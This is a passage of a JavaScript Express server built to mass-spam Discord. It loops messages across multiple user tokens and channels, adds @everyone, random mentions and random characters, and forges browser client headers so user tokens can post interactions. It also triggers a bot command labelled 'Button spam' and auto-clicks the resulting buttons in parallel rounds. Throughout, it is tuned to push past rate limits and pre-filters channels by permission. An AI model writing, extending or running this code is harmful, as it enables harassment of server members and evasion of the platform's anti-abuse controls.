                totalResults.total += result.total;
                if (result.cancelled) totalResults.cancelled = true;
            });
            
            return totalResults;
        };

        const sendMessage = async (token, channelId) => {
            const headers = getDiscordHeaders(token);
            const now = Date.now();
            
            // Check if channel is still rate limited
            if (channelRateLimitUntil[channelId] > now) {
                const waitTime = channelRateLimitUntil[channelId] - now;
                console.log(`[send-dm] CH ${channelId.slice(-4)} rate-limited, waiting ${waitTime}ms`);
                await delay(waitTime);
            }
            
            // Ensure minimum time between sends to same channel (1 second)
            const timeSinceLast = now - channelLastSend[channelId];
            if (timeSinceLast < DISCORD_CHANNEL_RATE_LIMIT_MS && channelLastSend[channelId] > 0) {
                const waitTime = DISCORD_CHANNEL_RATE_LIMIT_MS - timeSinceLast;
                await delay(waitTime);
            }
            
            let retries = 0;
            const maxRetries = 3;
            
            while (retries < maxRetries) {
                // Check for cancellation inside retry loop
                if (shouldCancel(operationId)) {
                    return { success: false, channelId, error: 'Cancelled by user', cancelled: true };
                }
                
                try {
                    // Use default message if message is empty or whitespace only
                    let content = (customMessage && customMessage.trim()) ? customMessage : defaultMessage;
                    
                    // ユーザーメンションを末尾に追加（空白を開けて）
                    if (selectedMentions > 0 && mentionIds.length > 0) {
                        const shuffled = [...mentionIds].sort(() => Math.random() - 0.5);
                        const mentions = shuffled.slice(0, selectedMentions).map(id => `<@${id}>`).join(' ');
                        content = content + ' ' + mentions;
                    }
                    
                    // includeEveryoneがtrueの場合、メッセージの末尾に@everyoneを追加（空白を開けて）
                    if (includeEveryone) {
                        content = content + ' @everyone';
                    }
                    
                    if (addRandomChars) {
                        content += ' ' + generateRandomChars(64);
                    }
                    
                    const requestBody = { 
                        content, 
                        allowed_mentions: { parse: ['everyone', 'users', 'roles'] } 
                    };
                    
                    if (pollData && pollData.question && pollData.answers && pollData.answers.length >= 2) {
                        requestBody.poll = {
                            question: { text: pollData.question },
                            answers: pollData.answers.map(a => ({ poll_media: { text: a } })),
                            duration: pollData.duration || 24,
                            allow_multiselect: pollData.multiselect || false
                        };
                    }
                    
                    const response = await axios.post(
                        `${DISCORD_API_BASE}/channels/${channelId}/messages`,
                        requestBody,
                        { headers, timeout: 15000 }
                    );
                    
                    // Update last send time
                    channelLastSend[channelId] = Date.now();
                    
                    // Check rate limit headers for preemptive throttling
                    const remaining = parseInt(response.headers['x-ratelimit-remaining']) || 5;
                    const resetAfter = parseFloat(response.headers['x-ratelimit-reset-after']) || 0;
                    
                    if (remaining <= 1 && resetAfter > 0) {
                        // Preemptively set rate limit for this channel
                        channelRateLimitUntil[channelId] = Date.now() + (resetAfter * 1000);
                        console.log(`[send-dm] CH ${channelId.slice(-4)} low remaining (${remaining}), preset wait ${Math.round(resetAfter*1000)}ms`);
                    }
                    
                    return { success: true, channelId };
                    
                } catch (err) {
                    if (err.response?.status === 429) {
                        results.rateLimitHits++;
                        const retryAfter = parseFloat(err.response?.data?.retry_after || 1);
                        channelRateLimitUntil[channelId] = Date.now() + (retryAfter * 1000) + 100;
                        
                        console.log(`[send-dm] 429 CH ${channelId.slice(-4)}, wait ${Math.round(retryAfter*1000)}ms (retry ${retries + 1}/${maxRetries})`);
                        // Check for cancellation before waiting
                        if (shouldCancel(operationId)) {
                            return { success: false, channelId, error: 'Cancelled during rate limit wait', cancelled: true };
                        }
                        await delay(retryAfter * 1000 + 50);
                        retries++;
                    } else {
                        console.log(`[send-dm] FAIL ${channelId.slice(-4)}: ${err.response?.data?.message || err.message}`);
                        return { success: false, channelId, error: err.response?.data?.message || err.message };
                    }
                }
            }
            
            return { success: false, channelId, error: 'Max retries exceeded' };
        };

        let totalSent = 0;
        let continueLoop = true;
        let cancelled = false;
        const startTime = Date.now();
        
        while (continueLoop && !cancelled) {
            // Check for cancellation at each round
            if (shouldCancel(operationId)) {
                console.log(`[send-dm] Operation cancelled at round ${results.rounds}`);
                cancelled = true;
                break;
            }
            
            results.rounds++;
            
            // Use parallel processing for faster message sending
            const channelPromises = channelIds.map(async (channelId) => {
                const channelResults = {
                    success: 0,
                    failed: 0,
                    total: 0
                };
                
                for (const token of tokens) {
                    if (!continueLoop || shouldCancel(operationId)) break;
                    
                    for (let i = 0; i < perChannelCount; i++) {
                        if (shouldCancel(operationId)) {
                            cancelled = true;
                            continueLoop = false;
                            break;
                        }
                        
                        if (maxTotal > 0 && totalSent >= maxTotal) {
                            continueLoop = false;
                            break;
                        }
                        
                        const result = await sendMessage(token, channelId);
                        
                        // Check if cancelled by sendMessage
                        if (result.cancelled) {
                            cancelled = true;
                            continueLoop = false;
                            console.log(`[send-dm] Operation cancelled inside sendMessage for channel ${channelId}`);
                            break;
                        }
                        
                        if (result.success) {
                            channelResults.success++;
                        } else {
                            channelResults.failed++;
                        }
                        channelResults.total++;
                        totalSent++;
                        
                        // Apply user delay between messages (after channel rotation handles rate limits)
                        if (userDelay > 0) {
                            await delay(userDelay);
                        }
                    }
                    if (cancelled) break;
                }
                
                return { channelId, results: channelResults };
            });
            
            // Execute all channel operations in parallel
            const channelResultsArray = await Promise.all(channelPromises);
            
            // Aggregate results from all channels
            for (const { channelId, results: channelResult } of channelResultsArray) {
                results.channels[channelId].success += channelResult.success;
                results.channels[channelId].failed += channelResult.failed;
                results.success += channelResult.success;
                results.failed += channelResult.failed;
                results.total += channelResult.total;
            }
            
            if (maxTotal <= 0) {
                continueLoop = false;
            }
        }

        const elapsed = Date.now() - startTime;
        const msgsPerSec = (results.success / (elapsed / 1000)).toFixed(2);
        
        endOperation(operationId);
        
        console.log(`[send-dm] DONE: ${results.success}/${results.total} in ${elapsed}ms (${msgsPerSec} msg/s, ${results.rateLimitHits} rate-limits)${cancelled ? ' [CANCELLED]' : ''}`);

        res.json({
            success: results.success,
            cancelled: cancelled,
            tokenCount: tokens.length,
            channelCount: channelIds.length,
            failed: results.failed,
            total: results.total,
            rounds: results.rounds,
            channels: results.channels,
            elapsedMs: elapsed,
            msgsPerSecond: parseFloat(msgsPerSec),
            rateLimitHits: results.rateLimitHits
        });

    } catch (error) {
        endOperation(operationId);
        console.error('Error sending DM:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Button creation tracker endpoints
app.post('/api/button-tracker/init', async (req, res) => {
    try {
        const { channelId, expectedCount } = req.body;
        
        if (!channelId || !expectedCount) {
            return res.status(400).json({ error: 'channelId and expectedCount are required' });
        }
        
        initializeButtonCreationTracker(channelId, expectedCount);
        
        res.json({
            success: true,
            message: `Initialized button creation tracker for channel ${channelId}`,
            expectedCount: expectedCount,
            channelId: channelId
        });
    } catch (error) {
        console.error('Error initializing button tracker:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/button-tracker/status/:channelId', async (req, res) => {
    try {
        const { channelId } = req.params;
        
        const status = getButtonCreationStatus(channelId);
        
        if (!status) {
            return res.json({
                success: true,
                status: null,
                message: 'No tracker found for this channel'
            });
        }
        
        res.json({
            success: true,
            status: status,
            channelId: channelId
        });
    } catch (error) {
        console.error('Error getting button tracker status:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/button-tracker/cleanup/:channelId', async (req, res) => {
    try {
        const { channelId } = req.params;
        
        cleanupButtonCreationTracker(channelId);
        
        res.json({
            success: true,
            message: `Cleaned up button creation tracker for channel ${channelId}`
        });
    } catch (error) {
        console.error('Error cleaning up button tracker:', error);
        res.status(500).json({ error: error.message });
    }
});

// Multi-channel /aanko execution endpoint (with delayed button click)
app.post('/api/aanko/execute-multi', async (req, res) => {
    try {
        const { token, guildId, channelIds, options } = req.body;
        
        if (!token || !guildId || !channelIds || !Array.isArray(channelIds) || channelIds.length === 0) {
            return res.status(400).json({ error: 'token, guildId, and channelIds (array) are required' });
        }
        
        console.log(`\n========== MULTI-AANKO START ==========`);
        console.log(`[MULTI-AANKO] Initializing /aanko execution on ${channelIds.length} channels`);
        console.log(`[MULTI-AANKO] Channels: ${channelIds.join(', ')}`);
        
        // Initialize tracker for all channels
        const trackerMap = new Map();
        channelIds.forEach(channelId => {
            initializeButtonCreationTracker(channelId, 1);
            trackerMap.set(channelId, null);
            console.log(`[MULTI-AANKO] Tracker initialized for channel ${channelId}`);
        });
        
        // Execute /aanko on all channels in parallel with delayClick=true
        console.log(`[MULTI-AANKO] Starting parallel /aanko execution (delayClick=true)...`);
        const executePromises = channelIds.map(async (channelId) => {
            try {
                console.log(`[MULTI-AANKO] Executing /aanko in channel ${channelId} (delayed click)...`);
                const result = await executeButtonViaGateway(token, channelId, guildId, CLIENT_ID, getRegisteredCommand().id, getRegisteredCommand().version, options, 10, 500, true);
                console.log(`[MULTI-AANKO] /aanko executed in channel ${channelId}: ${result.success ? 'SUCCESS' : 'FAILED'}`);
                if (result.success && result.messageId) {
                    trackerMap.set(channelId, result);
                }
                return {
                    channelId: channelId,
                    success: result.success,
                    messageId: result.messageId,
                    customId: result.customId,
                    message: result.message || result.error
                };
            } catch (error) {
                console.log(`[MULTI-AANKO] /aanko execution failed in channel ${channelId}: ${error.message}`);
                return {
                    channelId: channelId,
                    success: false,
                    error: error.message
                };
            }
        });
        
        const results = await Promise.all(executePromises);
        
        // Store button information for later clicking
        const buttonInfo = {};
        results.forEach(result => {
            if (result.success && result.messageId) {
                buttonInfo[result.channelId] = {
                    messageId: result.messageId,
                    customId: result.customId
                };
            }
        });
        
        console.log(`[MULTI-AANKO] All ${channelIds.length} /aanko commands executed (buttons created)`);
        console.log(`[MULTI-AANKO] Button info: ${JSON.stringify(buttonInfo)}`);
        console.log(`========== MULTI-AANKO END (buttons waiting to be clicked) ==========\n`);
        
        // Store in memory for later use
        global.pendingButtonClicks = global.pendingButtonClicks || {};
        global.pendingButtonClicks[guildId] = {
            token: token,
            guildId: guildId,
            buttons: buttonInfo,
            createdAt: Date.now()
        };
        
        res.json({
            success: true,
            message: `Created buttons on ${Object.keys(buttonInfo).length} channels (waiting for click signal)`,
            channelCount: channelIds.length,
            buttonCount: Object.keys(buttonInfo).length,
            results: results,
            note: 'Call /api/aanko/start-clicking to begin auto-clicking buttons'
        });
        
    } catch (error) {
        console.error('[MULTI-AANKO] Error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Endpoint to start clicking all pending buttons
app.post('/api/aanko/start-clicking', async (req, res) => {
    try {
        const { guildId } = req.body;
        
        if (!guildId) {
            return res.status(400).json({ error: 'guildId is required' });
        }
        
        const pendingData = global.pendingButtonClicks?.[guildId];
        
        if (!pendingData) {
            return res.status(400).json({ error: `No pending buttons found for guildId ${guildId}` });
        }
        
        console.log(`\n========== START CLICKING ==========`);
        console.log(`[START-CLICKING] Starting to click buttons for guild ${guildId}`);
        console.log(`[START-CLICKING] Button count: ${Object.keys(pendingData.buttons).length}`);
        
        // Click all buttons in parallel
        const clickPromises = Object.entries(pendingData.buttons).map(async ([channelId, buttonData]) => {
            try {
                console.log(`[START-CLICKING] Clicking button in channel ${channelId}...`);
                const result = await clickButtonDirectly(
                    pendingData.token, 
                    guildId, 
                    channelId, 
                    CLIENT_ID, 
                    buttonData.messageId, 
                    buttonData.customId, 
                    10, 
                    500
                );
                console.log(`[START-CLICKING] Button click started in channel ${channelId}: ${result.success ? 'SUCCESS' : 'FAILED'}`);
                return {
                    channelId: channelId,
                    success: result.success,
                    executed: result.executed,
                    total: result.total
                };
            } catch (error) {
                console.log(`[START-CLICKING] Button click failed in channel ${channelId}: ${error.message}`);
                return {
                    channelId: channelId,
                    success: false,
                    error: error.message
                };
            }
        });
        
        const clickResults = await Promise.all(clickPromises);
        
        // Cleanup
        delete global.pendingButtonClicks[guildId];
        
        console.log(`[START-CLICKING] All button clicks started`);
        console.log(`========== START CLICKING END ==========\n`);
        
        res.json({
            success: true,
            message: `Started clicking buttons for ${Object.keys(pendingData.buttons).length} channels`,
            results: clickResults
        });
        
    } catch (error) {
        console.error('[START-CLICKING] Error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Ultra-fast parallel button creation and clicking API
app.post('/api/fast-parallel-button', async (req, res) => {
    try {
        const { token, channelIds, guildId, message, userIds, mentionCount, clickCount, clickDelayMs } = req.body;

        if (!token || !channelIds || channelIds.length === 0) {
            return res.status(400).json({ error: 'token and channelIds are required' });
        }

        const channels = Array.isArray(channelIds) ? channelIds : [channelIds];
        const count = Math.max(parseInt(clickCount) || 1, 1);
        const clickDelay = Math.max(parseFloat(clickDelayMs) || 100, 50);
        const aankoCommand = getRegisteredCommand();
        
        if (!aankoCommand) {
            return res.status(500).json({ success: false, error: 'Bot command not registered yet' });
        }

        const generateSnowflake = () => {
            const timestamp = BigInt(Date.now() - 1420070400000) << 22n;
            const random = BigInt(Math.floor(Math.random() * 4194304));
            return (timestamp | random).toString();
        };

        const generateSessionId = () => {
            let result = '';
            for (let i = 0; i < 32; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const generateBoundary = () => {
            let result = '';
            for (let i = 0; i < 16; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const superProperties = {
            os: "Windows", browser: "Chrome", device: "", system_locale: "ja",
            browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            browser_version: "120.0.0.0", os_version: "10", release_channel: "stable",
            client_build_number: 251236
        };

        const execHeaders = {
            'Authorization': token,
            'X-Super-Properties': Buffer.from(JSON.stringify(superProperties)).toString('base64'),
            'X-Discord-Locale': 'ja',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        };

        const options = [];
        // Check if message contains @everyone to set the everyone option
        const includeEveryone = message && message.includes('@everyone');
        let cleanMessage = message;
        if (includeEveryone) {
            cleanMessage = message.replace(/@everyone\s*/g, '').trim();
        }
        if (cleanMessage) options.push({ type: 3, name: 'message', value: cleanMessage });
        if (userIds && userIds.length > 0) options.push({ type: 3, name: 'user_ids', value: userIds.join(',') });
        if (mentionCount) options.push({ type: 4, name: 'mention_count', value: parseInt(mentionCount) });
        if (includeEveryone) options.push({ type: 5, name: 'everyone', value: true });

        console.log(`[FAST-PARALLEL] Starting parallel button creation for ${channels.length} channels, includeEveryone=${includeEveryone}`);

        // Phase 1: Create buttons in all channels with retry for rate limits
        const sessionId = generateSessionId();
        const maxRetries = 3;
        const createResults = [];
        const createdChannels = [];
        
        const createButtonInChannel = async (channelId, retryCount = 0, initialDelay = 0) => {
            if (initialDelay > 0) await delay(initialDelay);
            
            const payload = {
                type: 2,
                application_id: CLIENT_ID,
                channel_id: channelId,
                session_id: sessionId,
                nonce: generateSnowflake(),
                data: {
                    version: aankoCommand.version,
                    id: aankoCommand.id,
                    name: 'aanko',
                    type: 1,
                    options: options,
                    application_command: {
                        id: aankoCommand.id,
                        application_id: CLIENT_ID,
                        version: aankoCommand.version,
                        name: 'aanko',
                        description: 'Button spam',
                        type: 1,
                        options: aankoCommand.options || [],
                        integration_types: [0, 1],
                        contexts: [0, 1, 2]
                    }
                }
            };
            if (guildId) payload.guild_id = guildId;

            const boundary = '----WebKitFormBoundary' + generateBoundary();
            const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(payload)}\r\n--${boundary}--`;

            try {
                await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, {
                    headers: { ...execHeaders, 'Content-Type': `multipart/form-data; boundary=${boundary}` }
                });
                console.log(`[FAST-PARALLEL] Created button in channel ${channelId}${retryCount > 0 ? ` (retry ${retryCount})` : ''}`);
                return { channelId, created: true, retryCount };
            } catch (e) {
                const errorMsg = e.response?.data?.message || e.message;
                const isRateLimited = e.response?.status === 429;
                const retryAfter = e.response?.data?.retry_after || 1;
                
                if (isRateLimited && retryCount < maxRetries) {
                    const waitTime = (retryAfter + 0.5) * 1000;
                    console.log(`[FAST-PARALLEL] Rate limited for ${channelId}, waiting ${waitTime}ms and retrying (${retryCount + 1}/${maxRetries})...`);
                    await delay(waitTime);
                    return createButtonInChannel(channelId, retryCount + 1, 0);
                }
                
                console.error(`[FAST-PARALLEL] Failed to create button in ${channelId}:`, errorMsg);
                return { channelId, created: false, error: errorMsg, retryCount, rateLimited: isRateLimited };
            }
        };
        
        // Create buttons with minimal staggered start times (push rate limit boundary)
        const createPromises = channels.map((channelId, index) => 
            createButtonInChannel(channelId, 0, index * 50)
        );

        const results = await Promise.all(createPromises);
        results.forEach(r => {
            createResults.push(r);
            if (r.created) createdChannels.push(r.channelId);
        });
        
        console.log(`[FAST-PARALLEL] Created buttons in ${createdChannels.length}/${channels.length} channels`);

        // Wait for buttons to be processed by bot
        await delay(1500);

        // Phase 2: Detect buttons from stored data
        const buttonData = [];
        for (const channelId of createdChannels) {
            const stored = getRecentButtonCreation(channelId);
            console.log(`[FAST-PARALLEL] Channel ${channelId}: stored=${!!stored}, customId=${stored?.buttonCustomId}, messageId=${stored?.messageId}, interactionToken=${stored?.interactionToken?.substring(0, 20)}...`);
            
            if (stored && stored.buttonCustomId) {
                let messageId = stored.messageId;
                
                // If messageId is undefined or pending, try to get it from the webhook
                if (!messageId || messageId.startsWith('pending_')) {
                    if (stored.interactionToken) {
                        try {
                            const webhookUrl = `${DISCORD_API_BASE}/webhooks/${CLIENT_ID}/${stored.interactionToken}/messages/@original`;
                            const response = await axios.get(webhookUrl);
                            messageId = response.data?.id;
                            console.log(`[FAST-PARALLEL] Fetched messageId=${messageId} from webhook for channel ${channelId}`);
                        } catch (e) {
                            console.log(`[FAST-PARALLEL] Failed to fetch message from webhook for channel ${channelId}: ${e.response?.data?.message || e.message}`);
                        }
                    }
                }
                
                if (messageId && !messageId.startsWith('pending_')) {
                    buttonData.push({
                        channelId,
                        messageId: messageId,
                        customId: stored.buttonCustomId
                    });
                }
            }
        }

        console.log(`[FAST-PARALLEL] Found ${buttonData.length} buttons to click`);

        // Phase 3: Parallel clicking with retry mechanism
        let totalExecuted = 0;
        let totalFailed = 0;
        const failedClicks = []; // Track failed clicks for retry

        const clickOneButton = async (data, round) => {
            try {
                const clickPayload = {
                    type: 3,
                    nonce: generateSnowflake(),
                    session_id: sessionId,
                    channel_id: data.channelId,
                    message_id: data.messageId,
                    message_flags: 64,
                    application_id: CLIENT_ID,
                    data: { component_type: 2, custom_id: data.customId }
                };
                if (guildId) clickPayload.guild_id = guildId;

                const boundary = '----WebKitFormBoundary' + generateBoundary();
                const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(clickPayload)}\r\n--${boundary}--`;

                await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, {
                    headers: { ...execHeaders, 'Content-Type': `multipart/form-data; boundary=${boundary}` }
                });
                return { success: true, channelId: data.channelId, round };
            } catch (e) {
                const isRateLimited = e.response?.status === 429;
                const retryAfter = e.response?.data?.retry_after || 0.5;
                return { success: false, channelId: data.channelId, round, error: e.response?.data?.message || e.message, isRateLimited, retryAfter, data };
            }
        };

        // Parallel clicking: fire all channel clicks at once per round
        console.log(`[FAST-PARALLEL] Starting parallel clicking: ${count} clicks per channel, ${buttonData.length} channels`);
        
        for (let round = 0; round < count; round++) {
            // Fire all clicks in parallel
            const roundPromises = buttonData.map(data => clickOneButton(data, round));
            const roundResults = await Promise.all(roundPromises);
            
            let roundSuccess = 0;
            let roundFailed = 0;
            
            for (const result of roundResults) {
                if (result.success) {
                    totalExecuted++;
                    roundSuccess++;
                } else {
                    roundFailed++;
                    // Queue failed clicks for retry
                    if (result.isRateLimited) {
                        failedClicks.push({ data: result.data, retryAfter: result.retryAfter, round });
                    } else {
                        totalFailed++;
                    }
                }
            }
            
            console.log(`[FAST-PARALLEL] Round ${round + 1}/${count}: ${roundSuccess}/${buttonData.length} successful, ${roundFailed} failed`);
            
            // Delay between rounds
            if (round < count - 1) {
                await delay(clickDelay);
            }
        }
        
        // Retry failed clicks
        if (failedClicks.length > 0) {
            console.log(`[FAST-PARALLEL] Retrying ${failedClicks.length} failed clicks...`);
            
            // Group by retry time and process
            for (const failed of failedClicks) {
                await delay((failed.retryAfter + 0.3) * 1000);
                const retryResult = await clickOneButton(failed.data, failed.round);
                if (retryResult.success) {
                    totalExecuted++;
                    console.log(`[FAST-PARALLEL] Retry for channel ${failed.data.channelId}: SUCCESS`);
                } else {
                    totalFailed++;
                    console.log(`[FAST-PARALLEL] Retry for channel ${failed.data.channelId}: FAILED`);
                }
            }
        }

        console.log(`[FAST-PARALLEL] Complete: ${totalExecuted} successful, ${totalFailed} failed`);

        res.json({
            success: true,
            channelCount: channels.length,
            buttonsCreated: createdChannels.length,
            buttonsFound: buttonData.length,
            clicksPerButton: count,
            totalExecuted,
            totalFailed,
            createResults,
            buttonData: buttonData.map(b => ({ channelId: b.channelId, customId: b.customId }))
        });

    } catch (error) {
        console.error('[FAST-PARALLEL] Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Ultra-fast instant parallel button API - fire and forget clicks
// IMPROVED: Pre-filter channels for permissions, batched requests with exponential backoff
app.post('/api/instant-parallel-button', async (req, res) => {
    try {
        const { token, channelIds, guildId, message, userIds, mentionCount, includeEveryone: reqIncludeEveryone } = req.body;

        if (!token || !channelIds || channelIds.length === 0) {
            return res.status(400).json({ error: 'token and channelIds are required' });
        }

        const inputChannels = Array.isArray(channelIds) ? channelIds : [channelIds];
        const aankoCommand = getRegisteredCommand();
        
        if (!aankoCommand) {
            return res.status(500).json({ success: false, error: 'Bot command not registered yet' });
        }

        const headers = getDiscordHeaders(token);
        
        const VIEW_CHANNEL = 1024n;
        const SEND_MESSAGES = 2048n;
        const USE_APPLICATION_COMMANDS = 2147483648n;
        const USE_EXTERNAL_APPS = 1125899906842624n;
        
        let channels = inputChannels;
        let skippedChannels = { noView: [], noSendMessages: [], noAppCommands: [] };
        
        const ADMINISTRATOR = 8n;
        
        if (guildId) {
            console.log(`[INSTANT-PARALLEL] Pre-filtering ${inputChannels.length} channels for permissions...`);
            
            let userRoleIds = [];
            let userId = null;
            let basePermissions = 0n;
            let isAdmin = false;
            
            try {
                const meResponse = await axios.get(`${DISCORD_API_BASE}/users/@me`, { headers });
                userId = meResponse.data.id;
                
                const memberResponse = await axios.get(`${DISCORD_API_BASE}/users/@me/guilds/${guildId}/member`, { headers });
                userRoleIds = memberResponse.data.roles || [];
                
                const rolesResponse = await axios.get(`${DISCORD_API_BASE}/guilds/${guildId}/roles`, { headers });
                const guildRoles = rolesResponse.data;
                const roleMap = new Map();
                guildRoles.forEach(r => roleMap.set(r.id, r));
                
                const everyoneRole = roleMap.get(guildId);
                if (everyoneRole) {
                    basePermissions = BigInt(everyoneRole.permissions || '0');
                }
                
                for (const roleId of userRoleIds) {
                    const role = roleMap.get(roleId);
                    if (role) {
                        basePermissions |= BigInt(role.permissions || '0');
                    }
                }
                
                isAdmin = (basePermissions & ADMINISTRATOR) !== 0n;
                if (isAdmin) {
                    console.log('[INSTANT-PARALLEL] User is admin, skipping permission filtering');
                    channels = inputChannels;
                }
            } catch (e) {
                console.log('[INSTANT-PARALLEL] Could not fetch user roles:', e.message);
                basePermissions = VIEW_CHANNEL | USE_APPLICATION_COMMANDS;
            }
            
            if (!isAdmin) {
                try {
                    const channelsResponse = await axios.get(`${DISCORD_API_BASE}/guilds/${guildId}/channels`, { headers });
                    const guildChannels = channelsResponse.data;
                    
                    const channelMap = new Map();
                    guildChannels.forEach(ch => channelMap.set(ch.id, ch));
                    
                    const filteredChannels = [];
                    
                    for (const channelId of inputChannels) {
                        const channel = channelMap.get(channelId);
                        if (!channel) {
                            filteredChannels.push(channelId);
                            continue;
                        }
                        
                        const overwrites = channel.permission_overwrites || [];
                        
                        let permissions = basePermissions;
                        
                        const everyoneOverwrite = overwrites.find(o => o.id === guildId);
                        if (everyoneOverwrite) {
                            permissions &= ~BigInt(everyoneOverwrite.deny || '0');
                            permissions |= BigInt(everyoneOverwrite.allow || '0');
                        }
                        
                        let roleAllow = 0n;
                        let roleDeny = 0n;
                        for (const roleId of userRoleIds) {
                            const roleOverwrite = overwrites.find(o => o.id === roleId && o.type === 0);
                            if (roleOverwrite) {
                                roleAllow |= BigInt(roleOverwrite.allow || '0');
                                roleDeny |= BigInt(roleOverwrite.deny || '0');
                            }
                        }
                        permissions &= ~roleDeny;
                        permissions |= roleAllow;
                        
                        if (userId) {
                            const userOverwrite = overwrites.find(o => o.id === userId && o.type === 1);
                            if (userOverwrite) {
                                permissions &= ~BigInt(userOverwrite.deny || '0');
                                permissions |= BigInt(userOverwrite.allow || '0');
                            }
                        }
                        
                        const hasViewChannel = (permissions & VIEW_CHANNEL) !== 0n;
                        const hasAppCommands = (permissions & USE_APPLICATION_COMMANDS) !== 0n;
                        const hasExternalApps = (permissions & USE_EXTERNAL_APPS) !== 0n;
                        
                        if (!hasViewChannel) {
                            skippedChannels.noView.push(channelId);
                            continue;
                        }
                        
                        if (!hasExternalApps) {
                            skippedChannels.noAppCommands.push(channelId);
                            continue;
                        }
                        
                        filteredChannels.push(channelId);
                    }
                    
                    channels = filteredChannels;
                    console.log(`[INSTANT-PARALLEL] Filtered: ${inputChannels.length} -> ${channels.length} channels (skipped: ${skippedChannels.noView.length} no view, ${skippedChannels.noAppCommands.length} no external apps)`);
                    
                } catch (e) {
                    console.log('[INSTANT-PARALLEL] Could not filter channels, using all:', e.message);
                }
            }
        }
        
        if (channels.length === 0) {
            return res.json({
                success: true,
                message: 'No valid channels to process after filtering',
                channelCount: 0,
                buttonsCreated: 0,
                clicksSent: 0,
                skippedChannels
            });
        }

        const generateSnowflake = () => {
            const timestamp = BigInt(Date.now() - 1420070400000) << 22n;
            const random = BigInt(Math.floor(Math.random() * 4194304));
            return (timestamp | random).toString();
        };

        const generateSessionId = () => {
            let result = '';
            for (let i = 0; i < 32; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const generateBoundary = () => {
            let result = '';
            for (let i = 0; i < 16; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const superProperties = {
            os: "Windows", browser: "Chrome", device: "", system_locale: "ja",
            browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            browser_version: "120.0.0.0", os_version: "10", release_channel: "stable",
            client_build_number: 251236
        };

        const execHeaders = {
            'Authorization': token,
            'X-Super-Properties': Buffer.from(JSON.stringify(superProperties)).toString('base64'),
            'X-Discord-Locale': 'ja',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        };

        const options = [];
        
        // Check if includeEveryone is explicitly requested OR if message contains @everyone
        const messageHasEveryone = message && message.includes('@everyone');
        const includeEveryone = reqIncludeEveryone === true || messageHasEveryone;
        let cleanMessage = message;
        if (messageHasEveryone) {
            // Remove @everyone from message since the bot will add it via the everyone option
            cleanMessage = message.replace(/@everyone\s*/g, '').trim();
        }
        
        if (cleanMessage) options.push({ type: 3, name: 'message', value: cleanMessage });
        if (userIds && userIds.length > 0) options.push({ type: 3, name: 'user_ids', value: userIds.join(',') });
        if (mentionCount) options.push({ type: 4, name: 'mention_count', value: parseInt(mentionCount) });
        if (includeEveryone) options.push({ type: 5, name: 'everyone', value: true });

        console.log(`[INSTANT-PARALLEL] Starting for ${channels.length} channels (filtered from ${inputChannels.length}), includeEveryone=${includeEveryone} (reqParam=${reqIncludeEveryone}, messageHas=${messageHasEveryone})`);

        const sessionId = generateSessionId();
        
        // Helper function to create button in a channel with individual retry
        const createButtonInChannel = async (channelId, attemptNum = 0) => {
            const payload = {
                type: 2,
                application_id: CLIENT_ID,
                channel_id: channelId,
                session_id: sessionId,
                nonce: generateSnowflake(),
                data: {
                    version: aankoCommand.version,
                    id: aankoCommand.id,
                    name: 'aanko',
                    type: 1,
                    options: options,
                    application_command: {
                        id: aankoCommand.id,
                        application_id: CLIENT_ID,
                        version: aankoCommand.version,
                        name: 'aanko',
                        description: 'Button spam',
                        type: 1,
                        options: aankoCommand.options || [],
                        integration_types: [0, 1],
                        contexts: [0, 1, 2]
                    }
                }
            };
            if (guildId) payload.guild_id = guildId;

            const boundary = '----WebKitFormBoundary' + generateBoundary();
            const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(payload)}\r\n--${boundary}--`;

            try {
                await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, {
                    headers: { ...execHeaders, 'Content-Type': `multipart/form-data; boundary=${boundary}` },
                    timeout: 10000
                });
                console.log(`[INSTANT-PARALLEL] Created button in ${channelId} (attempt ${attemptNum + 1})`);
                return { channelId, created: true, attempts: attemptNum + 1 };
            } catch (e) {
                const errorMsg = e.response?.data?.message || e.message;
                const isRateLimited = e.response?.status === 429;
                const retryAfter = e.response?.data?.retry_after || 1;
                const isTemporaryError = isRateLimited || e.code === 'ECONNRESET' || e.code === 'ETIMEDOUT';
                console.log(`[INSTANT-PARALLEL] Failed to create in ${channelId} (attempt ${attemptNum + 1}): ${errorMsg}${isRateLimited ? ` (retry_after: ${retryAfter}s)` : ''}`);
                return { channelId, created: false, error: errorMsg, isRateLimited, isTemporaryError, retryAfter, attempts: attemptNum + 1 };
            }
        };

        // IMPROVED: Process as fast as possible, rely on retry for rate limits
        const BATCH_SIZE = 5; // Process 5 channels at a time
        const BATCH_DELAY = 100; // 100ms between batches (minimal)
